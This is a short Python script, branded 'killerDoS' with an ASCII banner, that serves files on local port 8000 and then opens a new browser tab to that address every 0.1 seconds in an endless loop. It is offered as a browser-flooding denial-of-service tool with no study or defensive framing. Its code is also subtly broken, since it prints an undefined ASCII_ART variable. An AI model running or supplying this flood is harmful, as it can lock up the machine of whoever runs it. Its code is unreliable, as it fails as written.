#!/usr/bin/env python3

import os
import time
import webbrowser
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer

# Configuration

RED = "\033[38;5;196m"
RESET = "\033[0m"

text = [
r" __   .__.__  .__              ________          _________",
r"|  | _|__|  | |  |   __________\______ \   ____ /   _____/",
r"|  |/ /  |  | |  | _/ __ \_  __ \    |  \ /  _ \\_____  \ ",
r"|    <|  |  |_|  |_\  ___/|  | \/    `   (  <_> )        \\",
r"|__|_ \__|____/____/\___  >__| /_______  /\____/_______  /",
r"     \/                 \/             \/              \/ "
]

art = [
r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡆",
r"⠀⠀⠀⠀⠀⢀⣶⣆⢀⠔⠁⠀⣷",
r"⠀⠀⠀⠀⠀⠚⣿⣿⣷⡄⠀⠀⢸",
r"⠀⠀⠀⠀⠀⣠⣺⣿⣿⡇⠀⠀⠸",
r"⠀⠀⠀⠀⡸⣿⣿⣿⣿⡇⠀⠀⠀",
r"⠀⠀⠀⡔⠁⢸⣿⣿⣿⣿⠀⠀⠀",
r"⠀⠀⠌⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀",
r"⠀⡌⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀",
r"⠈⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀",
r"⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣷⠀⠀",
r"⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣷⣄",
r"⠀⠀⠀⠀⠀⠀⠛⠛⠛⠛⠛⠛⠉"
]

for i in range(max(len(text), len(art))):
    left = text[i] if i < len(text) else ""
    right = art[i] if i < len(art) else ""
    print(RED + left.ljust(70) + right + RESET)

PAYLOAD_PORT = 8000
TARGET_URL = f"http://localhost:{PAYLOAD_PORT}"
BROWSER_CMD = "xdg-open"  # Linux default browser opener

def flood_browser():
    while True:
        try:
            webbrowser.get(BROWSER_CMD).open_new_tab(TARGET_URL)
            time.sleep(0.1)  # Adjust delay to control flood speed
        except:
            continue

def start_http_server():
    server = HTTPServer(("", PAYLOAD_PORT), SimpleHTTPRequestHandler)
    server.serve_forever()

if __name__ == "__main__":
    print(ASCII_ART)

    print("[*] Starting HTTP server on port", PAYLOAD_PORT)

    threading.Thread(
        target=start_http_server,
        daemon=True
    ).start()

    time.sleep(1)  # Wait for server to initialize

    print("[*] Initiating browser flood...")

    flood_browser()
